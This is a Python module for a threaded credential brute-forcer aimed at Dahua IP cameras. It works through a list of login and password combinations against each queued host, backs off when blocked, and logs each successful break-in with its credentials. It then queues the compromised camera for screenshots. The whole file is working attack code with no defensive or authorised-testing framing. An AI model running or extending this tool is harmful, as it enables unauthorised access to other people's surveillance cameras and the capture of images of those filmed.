import logging
import threading
import socket

import config
from dahua import DahuaController, Status


class BruteThread(threading.Thread):
    def __init__(self, brute_queue, screenshot_queue):
        threading.Thread.__init__(self)
        self.brute_queue = brute_queue
        self.screenshot_queue = screenshot_queue

    def run(self):
        while True:
            with threading.Lock():
                host = self.brute_queue.get()
            self.dahua_auth(host)
            self.brute_queue.task_done()

    def dahua_login(self, ip, port, login, password):
        with threading.Lock():
            config.update_status()
            logging.debug(f'Login attempt: {ip} with {login}:{password}')
        dahua = DahuaController(ip, port, login, password)
        if dahua.status is Status.SUCCESS:
            logging.debug(f'Success login: {dahua.ip} with {login}:{password}')
            return dahua
        elif dahua.status is Status.BLOCKED:
            logging.debug(f'Blocked camera: {dahua.ip}:{dahua.port}')
            return Status.BLOCKED
        else:
            logging.debug(f'Unable to login: {dahua.ip}:{dahua.port} with {login}:{password}')
            return Status.NONE

    def dahua_auth(self, host):
        ip = host[0]
        port = int(host[1])
        for combination in config.combinations:
            login = combination[0]
            password = combination[1]
            try:
                res = self.dahua_login(ip, port, login, password)
                if res is Status.BLOCKED:
                    break
                if res is Status.NONE:
                    continue
                config.working_hosts.append([res.ip, res.port, res.login, res.password, res])
                config.ch_count += res.channels_count
                self.screenshot_queue.put(res)
                return
            except socket.timeout as e:
                logging.debug(f'Timeout error: {ip}:{port} - {str(e)}')
                return
            except Exception as e:
                logging.debug(f'Connection error: {ip}:{port} - {str(e)}')
